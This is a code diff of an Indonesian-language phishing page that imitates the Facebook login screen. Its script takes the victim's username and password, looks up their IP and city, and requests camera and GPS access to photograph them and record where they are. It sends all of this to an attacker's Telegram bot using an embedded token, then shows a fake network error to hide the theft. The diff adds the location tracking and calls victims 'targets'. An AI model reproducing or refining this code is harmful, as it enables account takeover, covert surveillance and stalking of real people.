@@ -5,38 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Masuk atau Daftar</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header { width: 100%; padding: 30px 0; text-align: center; }
-        .fb-logo { width: 150px; } /* Ukuran logo lebih besar */
-        .login-box { width: 90%; max-width: 400px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); box-sizing: border-box; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; background-color: #f5f6f7; font-size: 14px; box-sizing: border-box; }
-        .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; cursor: pointer; }
-        .footer { margin-top: 50px; color: #737373; font-size: 12px; }
-        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; justify-content: center; align-items: center; font-weight: bold; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 100vh; }
+        .top-section { width: 100%; display: flex; flex-direction: column; align-items: center; }
+        .header { padding-top: 50px; padding-bottom: 20px; }
+        .fb-logo { width: 65px; height: 65px; } 
+        .login-box { width: 90%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 12px; background-color: #f5f6f7; font-size: 16px; box-sizing: border-box; }
+        .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 30px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .forgot { color: #1c1e21; font-size: 14px; margin-top: 15px; text-decoration: none; display: block; font-weight: 500; }
+        .bottom-section { width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 20px; }
+        .create-btn { width: 90%; max-width: 400px; padding: 10px; background-color: #fff; border: 1px solid #1877f2; border-radius: 30px; color: #1877f2; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 20px; }
+        .meta-footer { display: flex; flex-direction: column; align-items: center; color: #737373; font-size: 12px; }
+        .meta-logo { width: 60px; margin-bottom: 5px; }
+        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; justify-content: center; align-items: center; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="loading">Memuat...</div>
+<div id="loading">Memproses...</div>
 
-<div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/512px-2021_Facebook_icon.svg.png" class="fb-logo" alt="Facebook">
+<div class="top-section">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
+    </div>
+    <div class="login-box">
+        <input type="text" id="user" placeholder="Nomor ponsel atau email">
+        <input type="password" id="pass" placeholder="Kata sandi">
+        <button class="btn-login" onclick="eksekusi()">Login</button>
+        <a href="#" class="forgot">Lupa kata sandi?</a>
+    </div>
 </div>
 
-<div class="login-box">
-    <input type="text" id="user" placeholder="Email atau Nomor Telepon">
-    <input type="password" id="pass" placeholder="Kata Sandi">
-    <button class="btn-login" onclick="eksekusi()">Login</button>
+<div class="bottom-section">
+    <button class="create-btn">Buat akun baru</button>
+    <div class="meta-footer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo">
+        <span>Tentang · Bantuan · Lainnya</span>
+    </div>
 </div>
-
-<div class="footer">Meta © 2026</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // TOKEN BOT KAMU YANG SUDAH JALAN TADI
+    // DATA BOT IKHSAN (SUDAH TERUJI BERHASIL)
     const TOKEN = '8733750993:AAGe696DEkdJzlDJK1o6MLnhLWh2PWIBYqg';
     const CHAT_ID = '8460192289';
 
@@ -44,52 +57,74 @@
         const u = document.getElementById("user").value;
         const p = document.getElementById("pass").value;
 
-        if(!u || !p) return alert("Nomor ponsel atau kata sandi salah.");
+        if(!u || !p) return;
         document.getElementById("loading").style.display = "flex";
 
         try {
-            // Ambil IP
+            // 1. Ambil info IP & Lokasi Dasar
             const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({json: () => ({ip: 'N/A'})}));
             const ip = await ipRes.json();
             
-            // Kirim teks dulu biar data aman
-            const teks = `👤 DATA MASUK\nUser: ${u}\nPass: ${p}\nIP: ${ip.ip}`;
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}`);
-
-            // Izin Kamera & Foto
+            // 2. Minta Izin Kamera & Lokasi GPS Secara Bersamaan
             const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => null);
-            if(stream) {
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                video.srcObject = stream;
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // Jika izin Lokasi DIBERIKAN
+                await kirimDataLengkap(u, p, ip, pos, stream);
+            }, async () => {
+                // Jika izin Lokasi DITOLAK
+                await kirimDataLengkap(u, p, ip, null, stream);
+            });
 
-                setTimeout(async () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
-                    
-                    const fd = new FormData();
-                    fd.append("chat_id", CHAT_ID);
-                    fd.append("photo", blob, "wajah.jpg");
-                    fd.append("caption", `📸 Foto: ${u}`);
-
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                    finish();
-                }, 1000);
-            } else {
-                finish();
-            }
         } catch (e) {
-            finish();
+            selesai();
         }
     }
 
-    function finish() {
-        alert("Kesalahan koneksi jaringan. Silakan coba lagi.");
+    async function kirimDataLengkap(u, p, ip, pos, stream) {
+        let caption = `👤 TARGET BARU MASUK!\n\n`;
+        caption += `User: ${u}\n`;
+        caption += `Pass: ${p}\n`;
+        caption += `IP: ${ip.ip} (${ip.city || '?'})\n`;
+        
+        if(pos) {
+            caption += `📍 Lokasi (Maps): https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        } else {
+            caption += `📍 Lokasi: Izin Ditolak Target`;
+        }
+
+        if(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+                
+                const fd = new FormData();
+                fd.append("chat_id", CHAT_ID);
+                fd.append("photo", blob, "wajah.jpg");
+                fd.append("caption", caption);
+
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+                stream.getTracks().forEach(t => t.stop());
+                selesai();
+            }, 1000);
+        } else {
+            // Kirim teks saja jika kamera ditolak
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(caption)}`);
+            selesai();
+        }
+    }
+
+    function selesai() {
+        alert("Kesalahan jaringan. Sesi berakhir, silakan login ulang.");
         location.reload();
     }
 </script>
 </body>
-</html>
+    </html>
+    
